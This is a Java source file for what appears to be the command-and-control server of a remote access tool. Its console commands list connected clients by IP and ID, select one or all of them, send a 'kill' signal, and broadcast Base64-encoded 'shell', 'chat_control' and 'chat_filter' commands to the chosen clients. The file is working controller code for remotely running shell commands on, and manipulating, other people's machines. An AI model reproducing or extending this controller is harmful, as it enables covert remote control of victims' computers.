package me.soda.server;

import org.java_websocket.WebSocket;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

public class CommandHandler {

    static List<WebSocket> connCollection;
    static boolean allMode = false;

    private void tryBroadcast(Server server, String message) {
        if (allMode) server.broadcast(message);
        else server.broadcast(message, connCollection);
    }

    public boolean handle(String in, Server server) {
        boolean stop = false;
        String[] msgArr = in.split(" ");
        if (msgArr.length > 0) {
            try {
                switch (msgArr[0]) {
                    case "stop":
                        server.stop();
                        stop = true;
                        break;
                    case "conn":
                        if (msgArr.length == 1) {
                            Server.log("----CONNECTIONS----");
                            server.getConnections().forEach(conn -> {
                                int index = conn.<Integer>getAttachment();
                                String address = conn.getRemoteSocketAddress().getAddress().getHostAddress();
                                Server.log(String.format("IP: %s, ID: %s%n", address, index));
                            });
                        } else if (msgArr.length == 3) {
                            switch (msgArr[1]) {
                                case "sel" -> {
                                    if (msgArr[2].equals("all")) {
                                        allMode = true;
                                        Server.log("Selected all clients!");
                                        break;
                                    }
                                    connCollection = new ArrayList<>();
                                    server.getConnections().stream().filter(conn ->
                                                    conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2]))
                                            .forEach(conn -> connCollection.add(conn));
                                    Server.log("Selected client!");
                                }
                                case "disconnect" -> {
                                    server.getConnections().stream().filter(conn ->
                                                    conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2]))
                                            .forEach(conn -> conn.send("kill"));
                                    Server.log("Client " + msgArr[2] + " disconnected");
                                }
                                default -> {
                                }
                            }
                        }
                        break;
                    case "chat":
                    case "chat_control":
                    case "chat_filter":
                    case "shell":
                        if (msgArr.length < 2) break;
                        String[] strArr = new String[msgArr.length - 1];
                        System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
                        tryBroadcast(server, msgArr[0] + " " + Base64.getEncoder().encodeToString(
                                String.join(" ", strArr).getBytes(StandardCharsets.UTF_8)));
                        break;
                    default:
                        tryBroadcast(server, in);
                        break;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return stop;
    }
}
